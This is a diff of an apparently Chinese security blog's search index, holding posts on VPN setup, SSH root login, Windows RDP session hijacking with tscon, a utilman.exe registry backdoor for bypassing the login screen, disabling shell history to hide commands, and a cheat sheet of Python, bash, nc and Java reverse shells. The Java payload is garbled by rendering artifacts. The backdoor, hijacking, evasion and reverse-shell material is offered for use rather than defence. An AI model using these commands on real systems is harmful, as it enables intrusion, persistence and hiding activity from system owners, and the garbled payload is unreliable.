@@ -1,6 +1,48 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>使用L2TP拨号上网</title>
+    <url>/2019/12/16/02/</url>
+    <content><![CDATA[<h2 id="什么是L2TP"><a href="#什么是L2TP" class="headerlink" title="什么是L2TP"></a>什么是L2TP</h2><div class="story post-story"><p>​    L2TP是一种工业标准的Internet隧道协议，功能大致和PPTP协议类似，比如同样可以对网络数据流进行加密。不过也有不同之处，比如PPTP要求网络为IP网络，L2TP要求面向数据包的点对点连接；PPTP使用单一隧道，L2TP使用多隧道；L2TP提供包头压缩、隧道验证，而PPTP不支持。</p>
+</div><h2 id="如何搭建IPsec-VPN"><a href="#如何搭建IPsec-VPN" class="headerlink" title="如何搭建IPsec VPN"></a>如何搭建IPsec VPN</h2><div class="story post-story"><p>1.首先需要购买一个VPS服务器（必须要是linux的），我这里用的是VULTR的，操作系统装Ubuntu 和 Debian，或者CentOS.</p>
+<p><img src="https://i.bmp.ovh/imgs/2019/12/658f5495ad257cab.png" class="lazyload" data-srcset="https://i.bmp.ovh/imgs/2019/12/658f5495ad257cab.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
+<p>2.使用一键部署脚本</p>
+<p>Ubuntu and Debian.</p>
+<pre><code>wget https://git.io/vpnsetup -O vpnsetup.sh &amp;&amp; sudo sh vpnsetup.sh
+</code></pre>
+<p>CentOS.</p>
+<pre><code>wget https://git.io/vpnsetup-centos -O vpnsetup.sh &amp;&amp; sudo sh vpnsetup.sh
+</code></pre>
+<p>慢慢等待自动部署。</p>
+<p>成功后的效果图：</p>
+<p><img src="https://i.bmp.ovh/imgs/2019/12/35df2bb229cb234b.png" class="lazyload" data-srcset="https://i.bmp.ovh/imgs/2019/12/35df2bb229cb234b.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
+<p>将后面4项全部复制出来保存好<code>Server IP: </code> <code>IPsec PSK: </code> <code>Username: </code> <code>Password: </code></p>
+</div><h2 id="Windows设置VPN拨号"><a href="#Windows设置VPN拨号" class="headerlink" title="Windows设置VPN拨号"></a>Windows设置VPN拨号</h2><div class="story post-story"><p>打开<code>网络和Internet设置</code>➡VPN➡添加VPN连接</p>
+<p><img src="https://i.bmp.ovh/imgs/2019/12/c253f9a6128caba4.png" class="lazyload" data-srcset="https://i.bmp.ovh/imgs/2019/12/c253f9a6128caba4.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
+<p>接下来在VPN提供商选择<code>Windows内置</code>，VPN类型选择<code>使用预共享密钥的L2TP/IPsec</code>，然后连接名称随便填，服务器名称或地址填VPS的IP，密钥：<code>IPsec PSK: </code>,然后加上<code>username</code>和<code>password</code>.（就是上面保存的）。都填完后选择保存。</p>
+<p><img src="https://i.bmp.ovh/imgs/2019/12/3aa6b642c85700fd.png" class="lazyload" data-srcset="https://i.bmp.ovh/imgs/2019/12/3aa6b642c85700fd.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
+<p>接下来在右下角找到连接就可以拨号VPN了</p>
+<p><img src="https://i.bmp.ovh/imgs/2019/12/4c267f6c7aaed118.png" class="lazyload" data-srcset="https://i.bmp.ovh/imgs/2019/12/4c267f6c7aaed118.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
+</div><h2 id="连接问题"><a href="#连接问题" class="headerlink" title="连接问题"></a>连接问题</h2><div class="story post-story"><p>第一次拨号可能会出现失败的情况，需要修改注册表解决</p>
+<p>将下复制：</p>
+<pre><code>Windows Registry Editor Version 5.00
+[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\RasMan\Parameters]
+&quot;ProhibitIpSec&quot;=dword:00000000
+[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\PolicyAgent]
+&quot;AssumeUDPEncapsulationContextOnSendRule&quot;=dword:00000002
+</code></pre>
+<p>放到记事本，并将后缀改为<code>.reg</code></p>
+<p><img src="https://i.bmp.ovh/imgs/2019/12/e808e0b21d2d1305.png" class="lazyload" data-srcset="https://i.bmp.ovh/imgs/2019/12/e808e0b21d2d1305.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
+<p>管理员权限运行，再次进行拨号就可拨上了</p>
+</div><h2 id="成功连接"><a href="#成功连接" class="headerlink" title="成功连接"></a>成功连接</h2><div class="story post-story"><p><img src="https://i.bmp.ovh/imgs/2019/12/ed82cb7e6849c0b8.png" class="lazyload" data-srcset="https://i.bmp.ovh/imgs/2019/12/ed82cb7e6849c0b8.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
+<p>GitHub地址：<a href="https://github.com/hwdsl2/setup-ipsec-vpn/blob/master/README-zh.md">https://github.com/hwdsl2/setup-ipsec-vpn/blob/master/README-zh.md</a></p>
+
+</div>]]></content>
+      <categories>
+        <category>脚本</category>
+      </categories>
+  </entry>
+  <entry>
     <title>看我如何拿下BC站的服务器</title>
     <url>/2019/12/10/01/</url>
     <content><![CDATA[<h2 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h2><div class="story post-story"><p>拿到目标网站，可见是一个很常规的bc站。</p>
@@ -85,6 +127,28 @@
       </categories>
   </entry>
   <entry>
+    <title>Google 云设置SSH密码链接</title>
+    <url>/2021/12/16/index-1/</url>
+    <content><![CDATA[<ul>
+<li><p>修改配置文件</p>
+<pre><code>vi /etc/ssh/sshd_config
+</code></pre>
+</li>
+<li><p>修改以下2行为yes</p>
+<pre><code>PermitRootLogin yes
+
+PasswordAuthentication yes
+</code></pre>
+</li>
+<li><p>修改完成后重启ssh</p>
+<pre><code>sudo /etc/init.d/ssh restart
+</code></pre>
+</li>
+</ul>
+
+]]></content>
+  </entry>
+  <entry>
     <title>关于Windows的一些特性</title>
     <url>/2019/12/26/03/</url>
     <content><![CDATA[<h2 id="部分图片看不清可右键新建标签页查看"><a href="#部分图片看不清可右键新建标签页查看" class="headerlink" title="部分图片看不清可右键新建标签页查看"></a>部分图片看不清可右键新建标签页查看</h2><div class="story post-story"><h2 id="一、先介绍两条命令吧"><a href="#一、先介绍两条命令吧" class="headerlink" title="一、先介绍两条命令吧"></a>一、先介绍两条命令吧</h2><h3 id="1-query-user命令"><a href="#1-query-user命令" class="headerlink" title="1.query user命令"></a>1.<code>query user</code>命令</h3><p>查询用户命令：<code>query user</code>在输入这一条命令后，会显示计算机机名或域，后面跟用户名。</p>
@@ -95,8 +159,8 @@
 <p>使用<code>query user</code>查询已登录的用户。</p>
 <p><img src="https://i.bmp.ovh/imgs/2019/12/ac34eed257e76464.png" class="lazyload" data-srcset="https://i.bmp.ovh/imgs/2019/12/ac34eed257e76464.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
 <p>接着使用<code>tscon ID号 /PASSWORD:该ID所对应的密码</code>进行切换</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tscon 2 /PASSWORD:*******</span><br></pre></td></tr></table></figure>
-
+<pre><code>tscon 2 /PASSWORD:*******
+</code></pre>
 <p><img src="https://i.bmp.ovh/imgs/2019/12/686ae647fcd40201.png" class="lazyload" data-srcset="https://i.bmp.ovh/imgs/2019/12/686ae647fcd40201.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
 <p>回车之后，就切换到了<code>administrator</code>的远程桌面</p>
 <p><img src="https://i.bmp.ovh/imgs/2019/12/0ae84e9f6e5e2adf.png" class="lazyload" data-srcset="https://i.bmp.ovh/imgs/2019/12/0ae84e9f6e5e2adf.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
@@ -106,15 +170,15 @@
 <h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>这里使用的是incognito提权（还有很多其他方法，自行百度，不一一举例了）</p>
 <p><img src="https://i.bmp.ovh/imgs/2019/12/9c3a427f9af86c02.png" class="lazyload" data-srcset="https://i.bmp.ovh/imgs/2019/12/9c3a427f9af86c02.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
 <p>使用System权限进行切换</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tscon ‘ID号’</span><br></pre></td></tr></table></figure>
-
+<pre><code>tscon ‘ID号’
+</code></pre>
 <p><img src="https://i.bmp.ovh/imgs/2019/12/403f62d2c1a4682f.png" class="lazyload" data-srcset="https://i.bmp.ovh/imgs/2019/12/403f62d2c1a4682f.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
 <p>可见，无需输入密码，直接切换了</p>
 <p><img src="https://i.bmp.ovh/imgs/2019/12/462ef774e2a84b49.png" class="lazyload" data-srcset="https://i.bmp.ovh/imgs/2019/12/462ef774e2a84b49.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
 </div><h2 id="四、使用场景三"><a href="#四、使用场景三" class="headerlink" title="四、使用场景三"></a>四、使用场景三</h2><div class="story post-story"><p>比如在渗透过程中，可以利用辅助工具管理器后门（如放大镜后门）绕过系统登陆界面</p>
 <p>通过注册表劫持实现后门，修改注册表的命令如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">REG ADD &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe&quot; /t REG_SZ /v Debugger /d &quot;C:\windows\system32\cmd.exe&quot; /f</span><br></pre></td></tr></table></figure>
-
+<pre><code>REG ADD &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe&quot; /t REG_SZ /v Debugger /d &quot;C:\windows\system32\cmd.exe&quot; /f
+</code></pre>
 <p><img src="https://s2.ax1x.com/2019/12/26/lAQnUI.png" class="lazyload" data-srcset="https://s2.ax1x.com/2019/12/26/lAQnUI.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
 <p>使用快捷键<code>win+u</code>调出CMD窗口</p>
 <p><img src="https://s2.ax1x.com/2019/12/26/lAlrfP.png" class="lazyload" data-srcset="https://s2.ax1x.com/2019/12/26/lAlrfP.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
@@ -132,62 +196,10 @@
       </categories>
   </entry>
   <entry>
-    <title>使用L2TP拨号上网</title>
-    <url>/2019/12/16/02/</url>
-    <content><![CDATA[<h2 id="什么是L2TP"><a href="#什么是L2TP" class="headerlink" title="什么是L2TP"></a>什么是L2TP</h2><div class="story post-story"><p>​    L2TP是一种工业标准的Internet隧道协议，功能大致和PPTP协议类似，比如同样可以对网络数据流进行加密。不过也有不同之处，比如PPTP要求网络为IP网络，L2TP要求面向数据包的点对点连接；PPTP使用单一隧道，L2TP使用多隧道；L2TP提供包头压缩、隧道验证，而PPTP不支持。</p>
-</div><h2 id="如何搭建IPsec-VPN"><a href="#如何搭建IPsec-VPN" class="headerlink" title="如何搭建IPsec VPN"></a>如何搭建IPsec VPN</h2><div class="story post-story"><p>1.首先需要购买一个VPS服务器（必须要是linux的），我这里用的是VULTR的，操作系统装Ubuntu 和 Debian，或者CentOS.</p>
-<p><img src="https://i.bmp.ovh/imgs/2019/12/658f5495ad257cab.png" class="lazyload" data-srcset="https://i.bmp.ovh/imgs/2019/12/658f5495ad257cab.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
-<p>2.使用一键部署脚本</p>
-<p>Ubuntu and Debian.</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget https://git.io/vpnsetup -O vpnsetup.sh &amp;&amp; sudo sh vpnsetup.sh</span><br></pre></td></tr></table></figure>
-
-<p>CentOS.</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget https://git.io/vpnsetup-centos -O vpnsetup.sh &amp;&amp; sudo sh vpnsetup.sh</span><br></pre></td></tr></table></figure>
-
-<p>慢慢等待自动部署。</p>
-<p>成功后的效果图：</p>
-<p><img src="https://i.bmp.ovh/imgs/2019/12/35df2bb229cb234b.png" class="lazyload" data-srcset="https://i.bmp.ovh/imgs/2019/12/35df2bb229cb234b.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
-<p>将后面4项全部复制出来保存好<code>Server IP: </code> <code>IPsec PSK: </code> <code>Username: </code> <code>Password: </code></p>
-</div><h2 id="Windows设置VPN拨号"><a href="#Windows设置VPN拨号" class="headerlink" title="Windows设置VPN拨号"></a>Windows设置VPN拨号</h2><div class="story post-story"><p>打开<code>网络和Internet设置</code>➡VPN➡添加VPN连接</p>
-<p><img src="https://i.bmp.ovh/imgs/2019/12/c253f9a6128caba4.png" class="lazyload" data-srcset="https://i.bmp.ovh/imgs/2019/12/c253f9a6128caba4.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
-<p>接下来在VPN提供商选择<code>Windows内置</code>，VPN类型选择<code>使用预共享密钥的L2TP/IPsec</code>，然后连接名称随便填，服务器名称或地址填VPS的IP，密钥：<code>IPsec PSK: </code>,然后加上<code>username</code>和<code>password</code>.（就是上面保存的）。都填完后选择保存。</p>
-<p><img src="https://i.bmp.ovh/imgs/2019/12/3aa6b642c85700fd.png" class="lazyload" data-srcset="https://i.bmp.ovh/imgs/2019/12/3aa6b642c85700fd.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
-<p>接下来在右下角找到连接就可以拨号VPN了</p>
-<p><img src="https://i.bmp.ovh/imgs/2019/12/4c267f6c7aaed118.png" class="lazyload" data-srcset="https://i.bmp.ovh/imgs/2019/12/4c267f6c7aaed118.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
-</div><h2 id="连接问题"><a href="#连接问题" class="headerlink" title="连接问题"></a>连接问题</h2><div class="story post-story"><p>第一次拨号可能会出现失败的情况，需要修改注册表解决</p>
-<p>将下复制：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Windows Registry Editor Version 5.00</span><br><span class="line">[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\RasMan\Parameters]</span><br><span class="line">&quot;ProhibitIpSec&quot;=dword:00000000</span><br><span class="line">[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\PolicyAgent]</span><br><span class="line">&quot;AssumeUDPEncapsulationContextOnSendRule&quot;=dword:00000002</span><br></pre></td></tr></table></figure>
-
-<p>放到记事本，并将后缀改为<code>.reg</code></p>
-<p><img src="https://i.bmp.ovh/imgs/2019/12/e808e0b21d2d1305.png" class="lazyload" data-srcset="https://i.bmp.ovh/imgs/2019/12/e808e0b21d2d1305.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
-<p>管理员权限运行，再次进行拨号就可拨上了</p>
-</div><h2 id="成功连接"><a href="#成功连接" class="headerlink" title="成功连接"></a>成功连接</h2><div class="story post-story"><p><img src="https://i.bmp.ovh/imgs/2019/12/ed82cb7e6849c0b8.png" class="lazyload" data-srcset="https://i.bmp.ovh/imgs/2019/12/ed82cb7e6849c0b8.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
-<p>GitHub地址：<a href="https://github.com/hwdsl2/setup-ipsec-vpn/blob/master/README-zh.md">https://github.com/hwdsl2/setup-ipsec-vpn/blob/master/README-zh.md</a></p>
-
-</div>]]></content>
-      <categories>
-        <category>脚本</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>Google 云设置SSH密码链接</title>
-    <url>/2021/12/16/index-1/</url>
-    <content><![CDATA[<ul>
-<li><p>修改配置文件</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vi /etc/ssh/sshd_config</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
-<li><p>修改以下2行为yes</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PermitRootLogin yes</span><br><span class="line"></span><br><span class="line">PasswordAuthentication yes</span><br></pre></td></tr></table></figure></li>
-<li><p>修改完成后重启ssh</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo /etc/init.d/ssh restart</span><br></pre></td></tr></table></figure></li>
-</ul>
-
-]]></content>
-  </entry>
-  <entry>
     <title>使用curl命令进行文件上传</title>
     <url>/2021/12/22/index_2/</url>
     <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
-  <script id="hbeData" type="hbeData" data-hmacdigest="554fe1278c515cc682d4a58b2d003137072a9808fb0e0bbab1ac4e655004cef4">e5ee37e524ff41b96971c26a367fb171b4bd3bd307bdd2d4913e727e12f8ff9d80b59ec2147160ffee386031f7ec29c131e1660c84dd87a98ee2e9121b1f4f7cc9d90c834a6d99f30ad9c00b1074bd1bf08d523bbd2b26c3a6ffe8c56c82d954572e0a604b7aa4686c165a0c83fba95ac751c17fd4e84ead39a5870c61ffa5cd806e00fa347d43db4287faf2fa136b790dd6b83a25c0691ea3b5a1f2326d285c061adc54abdcf63428522df55fe2b5540e2460c06284ef18c60cca4b2a1c23a76e648c5f3b6a51eb036f072d84e5afc383a669afba1a6d2f265c5a4e5cc66bd346cdf073b7a1b09b8402aef84c8eb5548e31186b56eb0e8e375563263f9772a5c4fb22e3e25ac5a6c12ca5542162203912de6d48c2dbf242927b47e5fe8d67a550fe5ebf277585de9f1cb949d3c5584bdea01b0c600b12e15ca4e25a35ac95d1c10623f6bcef4a9f23537066bb2ea2ebf646a10da88fe81879b603435cc2c33b1cd961834ffa33e725c52c586116fd93f73f294cea220e539441c446bce3686a520418b9d4de81c0667a115993f5b503fc38b77351d6b0155599e2716c9f220058a8dcdde599f8805daed98bf3de6bd9346e2eaa8eaee8d34c7a9619e23b1223f5f9fba19cda851af9ba93b92a50fa4436ba580a50f429b5b371bb4873c81e73fbced27c4f753aa1620e66be8217024dca990f34fdadc08560f68f1db5cd721e9a7afb1c63feaa87e4e79d5aab5a9257c61a3c505875d3ddcf77b83c171e52d24309866e45d8f042d2230471c5e1958fd9adcd9cfe400b2fd259653ab9e6bd9e0cb643746d12b6ae60a6728a365d3addd276b7058471b8b0da230f7c63f8adf08d3bfe64cb25251c44793ba9578deb871474dc0008018d9bbede558b17ed0f44b0ab2d7ddb405c4412dfffa043e6d33544d583f61a372ef538f89a2866104a86b378ed2df51d8a0ff517830497e61c38e6f8c5da6ef257d35fa8b7b36c696475db8a5fa2dc46e5de3105e8a54be51b670448458cebc0ff6f4578911343578efc1732c6f98b2ac0556d9c8803196e80e92e273ed8198d84c7d0aeb5769d82792c2cd9f92d7cef2da92f59dea53329993ff616b247828464256635441b3f52be04bd1a1b06f7a9deac5c89360ace032ba8dd625cdda110d71ec73b294a4d6a8bd0322fe68a645f1f96064dc9513f5ab88a4c81282e163df5b33f9dbe8c6e654937cd319e015bca967c15effd94c2b73d0ab2c0973031ea163fa4d02730814211e3f4605b53e1ee60095de22019726d9d4b3bcfdd71c028cc346321b248c0ec1d3c1dc42521e2cc93db46d49e05f6a752d25ad6a6b47975bb2e02b3d0b2f42626c27058dedeaef0f42fe5279e0fc433dd9836bde1363a2627a6b6a5ce245e8bd653cd0e087c065cea8b2890ca53460d422841815c019fca650a896eb7e0f69ec44f1afd0824362a3e3331e97dae39070786bf13e715e38ef98cae7feb3cb544110712703940330e667631eb34e4a924d7c95dae59c84ace660f300b1a3d58cb2a201a5d10214ca662cc4e38b710d890472ce2ee888d77ff5e32d7a895746997582558e82dc3b308e254cd0bf85458d3d39280f408105bbabe900de241da4895c6448b60cf24b1a50b8c57620f32a96efdd1b513f8f9e994e893086480f90fa8c43d8c5282504ca861a1e27072bc37d6df724564a5fbb4ed4de127e4bfed04cf4d5176c10cfaebaa63b49af97d96ebfb722174e6ac522342a9b8c49dc5531ef280057f46d964bba28aa7c46e59aa9713d49048354fec7f8df51fcdf4239efd468d03a0349e1d51bc91ea4d2b1865744367c951ac8194f834905a26371bb642f129a4bab2322d4902c7619801ccfaf66df3bfdc84d45f6e2e738d2e3a3a1e92b821b202c9edf6119601961d064d38f9b0ede9c220351ba19948ab3803facfb4d3497035de2b4f56d84b628f2245cdd02d185b0328c1aa09d81bb3616d6ea406079d25ce88f11552d0fd91fbf7beaaaf859c5cea8753a9ffbfc275e5c2338d251faa6644527e980aa95c7668e2da477d3baa7df183d94678fb65b4650023131845e967875696fd2c93cacc401b6975ef3d1bf0ff2d3241b0763ce9f5afb476f053612762e3ba246d637adb14331854f0b10b9e6586e10142f9887f4c993a542e1c5cfc66e6333911a00abb15eca6901923486a4c4e2c9fa8253c1c2760fbf43665da9c920e3e1ec291ffda91bf4fa3f614b284945cfd3b9a6c8768ab84dd1d1205518705d284b368fd1f3a8e90603c1d0b54c5cb10876dd735d141fb0a4875551ae95d8be90f44a4cf871d21730d77595fe2f8ddd8ed657a3442cbd81d9af32344a055b37204a19b363935be1a291a2153100676a8d2e62d0c59a0dba7844a0125023ac4c03369860241faef5c697e9003916e</script>
+  <script id="hbeData" type="hbeData" data-hmacdigest="c04e83ec810cccbb711cf75333c7495db5854cd9de8ba751e0668b4ab417cad4">e5ee37e524ff41b96971c26a367fb171b4bd3bd307bdd2d4913e727e12f8ff9d80b59ec2147160ffee386031f7ec29c131e1660c84dd87a98ee2e9121b1f4f7cc9d90c834a6d99f30ad9c00b1074bd1bf08d523bbd2b26c3a6ffe8c56c82d954572e0a604b7aa4686c165a0c83fba95ac751c17fd4e84ead39a5870c61ffa5cd806e00fa347d43db4287faf2fa136b790dd6b83a25c0691ea3b5a1f2326d285c061adc54abdcf63428522df55fe2b5540e2460c06284ef18c60cca4b2a1c23a76e648c5f3b6a51eb036f072d84e5afc383a669afba1a6d2f265c5a4e5cc66bd346cdf073b7a1b09b8402aef84c8eb5548e31186b56eb0e8e375563263f9772a5c4fb22e3e25ac5a6c12ca55421622039c68b85a4908442893296323661649416464e6575337b427fc8d5e6b2d77b1bf47cd21263132321e4d1ecb858cbf50c326da3114dd79a9d1392d1433e422479a79c1b903497c4156211895355aa9ce5395cbaa9e1f02e63e5e57ccf0bb6d5fbdb52c4b09ff5c3482acb57c4781242a9898f58341bd2d45e5580a303b663bdcee5775429b55b28316d88bcbf14c8f321e9cf11a9fd8524e2b19bacb44911217bd038081c1937fc48894a1810e668ade8af7c96c48da9824059aa643293344ad394f8b6db67f9d2283a8b0d9f24e648e7bbe185a0017db483f56f152b65c815fecc9adebbaa5ec1bad9cd22aea54530a7ab4d4632e8cb9866a95e429020d4e733d52aac7185df9be12bcfef776c72e523d38298c175446b2188a8a4fa68c6141a9819798fa594b6fcb6c0e13052fb6182ffa9748a43aeb20afaf6a8f6264356effae0adcc3c866bf92533287f14a120515628ae0f2e2047cbdc10ffbd44bf6a2dea1c234bdaa14ce16f3624022c61f518e10fd56b298735086183e0cb0708708261ebe996879fed59db6dd40296387516b23ffaeda8d7a5bf2c94d2904aa503d9618cb4f0be8c23b20d56ed7d7a09e2f76ea816dcc15479168acde75fd4170b7862f4cb1d931ba02666f161ec1472dd47075ee760907c611db0b729ad8a994e6e7a269daec68e97c6126687969bae504c369d93c5ee829c5ba26e4325643006032f0175c97f7c7132988ba6f6e21796288ddc8291618c021a69b96abdb9bba2d8530957d5fa41a1eb2a45a4faf1a957ec204968cf03a74496541035651bc3163e1589e0ef1cbd054d12b2af88377b6d38ee1fb08d1183dcad341614a86f20462e770b3d746dbe774d86bedcc06d4b86e4a24ce3e2f4a511ce5a1a7e3495dcc58963116d23cdcb8c0ff84a8b85aebed752ab7649e766daab1f82469f78fbc3c30602</script>
   <div class="hbe hbe-content">
     <div class="hbe hbe-input hbe-input-default">
       <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
@@ -203,49 +215,69 @@
     <title>Linux 使输入的命令不被记录</title>
     <url>/2021/12/22/index_3/</url>
     <content><![CDATA[<p>使输入的命令不被记录：<code>unset HISTFILE</code></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">unset HISTFILE </span><br></pre></td></tr></table></figure>
-<h4 id="or"><a href="#or" class="headerlink" title="or"></a>or</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG; export HISTFILE=/dev/null; export HISTSIZE=0; export HISTFILESIZE=0</span><br></pre></td></tr></table></figure>
-
+<pre><code>unset HISTFILE 
+</code></pre>
+<h4 id="or"><a href="#or" class="headerlink" title="or"></a>or</h4><pre><code>unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG; export HISTFILE=/dev/null; export HISTSIZE=0; export HISTFILESIZE=0
+</code></pre>
 <h5 id="这样的话，在Linux上输入的命令将不会记录在-bash-history"><a href="#这样的话，在Linux上输入的命令将不会记录在-bash-history" class="headerlink" title="这样的话，在Linux上输入的命令将不会记录在 .bash_history"></a>这样的话，在Linux上输入的命令将不会记录在 <code>.bash_history</code></h5>
 ]]></content>
   </entry>
   <entry>
     <title>几种反弹shell的方式</title>
     <url>/2021/12/23/index_4/</url>
-    <content><![CDATA[<h3 id="Python版"><a href="#Python版" class="headerlink" title="Python版"></a>Python版</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;0.0.0.0&quot;,8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span></span><br></pre></td></tr></table></figure>
+    <content><![CDATA[<h3 id="Python版"><a href="#Python版" class="headerlink" title="Python版"></a>Python版</h3><pre><code class="Python">python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;0.0.0.0&quot;,8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39;
+</code></pre>
+<h3 id="bash-版"><a href="#bash-版" class="headerlink" title="bash 版"></a>bash 版</h3><pre><code>bash -i &gt;&amp; /dev/tcp/0.0.0.0/8888 0&gt;&amp;1  
+</code></pre>
+<h3 id="NC版"><a href="#NC版" class="headerlink" title="NC版"></a>NC版</h3><pre><code>nc -e /bin/sh 0.0.0.0 8888
+</code></pre>
+<h3 id="Java版"><a href="#Java版" class="headerlink" title="Java版"></a>Java版</h3><pre><code class="JavaScript">r = Runtime.getRuntime() p = r.exec([&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/0.0.0.0/8888;cat &lt;&amp;5 2=&quot;&quot; |=&quot;&quot; while=&quot;&quot; read=&quot;&quot; line;=&quot;&quot; do=&quot;&quot; \$line=&quot;&quot;&gt;&amp;5 &gt;&amp;5; done&quot;] as String[]) p.waitFor()
+</code></pre>
 
-
-<h3 id="bash-版"><a href="#bash-版" class="headerlink" title="bash 版"></a>bash 版</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/0.0.0.0/8888 0&gt;&amp;1  </span><br></pre></td></tr></table></figure>
-
-
-<h3 id="NC版"><a href="#NC版" class="headerlink" title="NC版"></a>NC版</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -e /bin/sh 0.0.0.0 8888</span><br></pre></td></tr></table></figure>
-
-
-<h3 id="Java版"><a href="#Java版" class="headerlink" title="Java版"></a>Java版</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">r = Runtime.getRuntime() p = r.exec([<span class="string">&quot;/bin/bash&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;exec 5&lt;&gt;/dev/tcp/0.0.0.0/8888;cat &lt;&amp;5 2=&quot;</span><span class="string">&quot; |=&quot;</span><span class="string">&quot; while=&quot;</span><span class="string">&quot; read=&quot;</span><span class="string">&quot; line;=&quot;</span><span class="string">&quot; do=&quot;</span><span class="string">&quot; \$line=&quot;</span><span class="string">&quot;&gt;&amp;5 &gt;&amp;5; done&quot;</span>] <span class="keyword">as</span> <span class="built_in">String</span>[]) p.waitFor()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-
-
+]]></content>
+  </entry>
+  <entry>
